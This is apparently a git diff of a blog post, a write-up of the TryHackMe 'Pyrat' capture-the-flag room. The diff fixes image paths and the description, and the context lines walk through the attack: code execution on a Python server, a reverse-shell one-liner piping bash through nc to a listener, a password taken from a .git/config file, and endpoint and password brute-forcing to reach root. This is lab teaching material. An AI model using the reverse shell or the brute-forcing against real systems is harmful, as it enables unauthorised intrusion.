@@ -1,7 +1,7 @@
 ---
 title: "Pyrat"
 description: "
-Description here
+Writeup of the 'Easy' Tryhackme room: Pyrat
 "
 author: "squ4r00t"
 date: 2024-10-09 00:00:00 +0800
@@ -11,7 +11,7 @@ pin: false
 math: true
 mermaid: true
 image:
-  path: http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/pyrat.webp
+  path: /assets/img/2024-10-09-writeup-tryhackme-pyrat/pyrat.webp
 ---
 
 ### Overview
@@ -83,7 +83,7 @@ We have 2 ports open:
 
 When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_more_basic.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_more_basic.webp)
 
 Let’s try it with curl too:
 
@@ -91,7 +91,7 @@ Let’s try it with curl too:
 curl http://10.10.167.212:8000 -i
 ```
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_with_curl.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_with_curl.webp)
 
 We can see in the response headers that the server is `SimpleHTTP/0.6 Python/3.11.2` and the response body is the same as before: "Try a more basic connection."
 
@@ -103,7 +103,7 @@ nc 10.10.167.212 8000
 
 With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/py_code_exec.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/py_code_exec.webp)
 
 We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:
 
@@ -113,7 +113,7 @@ import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <L
 
 Don’t forget to replace `<LHOST>` and `<LPORT>` with the IP and Port of your listener.
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/rev_shell.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/rev_shell.webp)
 
 We got a shell back!
 
@@ -121,17 +121,17 @@ After some exploration, we stumble upon an interesting folder at `/opt/dev`. Lis
 
 When we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/dubious_ownership_git.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/dubious_ownership_git.webp)
 
 We can see that the user `think` is the owner of this repo.
 
 With further digging, we find a password inside `/opt/dev/.git/config`:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/think_user_password.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/think_user_password.webp)
 
 If we try this password with ssh, we are able to login to the machine as think and get the user flag at `/home/think/user.txt`:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/user_flag.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/user_flag.webp)
 
 Now that we have a shell as think, let’s see what was in that git repository.
 
@@ -139,7 +139,7 @@ Now that we have a shell as think, let’s see what was in that git repository.
 git status
 ```
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/git_status.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/git_status.webp)
 
 We can see that there was a file named `pyrat.py.old`. Let’s restore it and see its contents:
 
@@ -189,11 +189,11 @@ But before that, let’s see how the server behaves when it is provided a valid 
 
 For the valid endpoint, let’s just try `shell`:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/valid_endpoint.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/valid_endpoint.webp)
 
 We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (`invalid123`):
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/invalid_endpoint.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/invalid_endpoint.webp)
 
 We get the message: “name ‘invalid123’ is not defined”.
 
@@ -246,11 +246,11 @@ It is considered a potential valid endpoint and the script prompt us if we want 
 
 > Feel free to improve the script to your liking
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/endpoint_fuzz_script.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/endpoint_fuzz_script.webp)
 
 After running the script, we eventually get the right endpoint. Let’s try it!
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/entering_valid_endpoint.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/entering_valid_endpoint.webp)
 
 We are prompted for a password…
 
@@ -260,11 +260,11 @@ If we go back to the room’s description:
 
 We see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/3_wrong_pass.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/3_wrong_pass.webp)
 
 We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/re_enter_valid_endpoint.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/re_enter_valid_endpoint.webp)
 
 After re-entering the valid endpoint, we get prompted for the password again…
 
@@ -352,10 +352,10 @@ pass5
 
 If we run the script:
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/brute_force_script.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/brute_force_script.webp)
 
 Well, looks like we got it…
 
-![](http://localhost:4000/assets/img/2024-10-09-writeup-tryhackme-pyrat/root_flag.webp)
+![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/root_flag.webp)
 
 We spawn a shell as root and get the root flag at /root/root.txt.
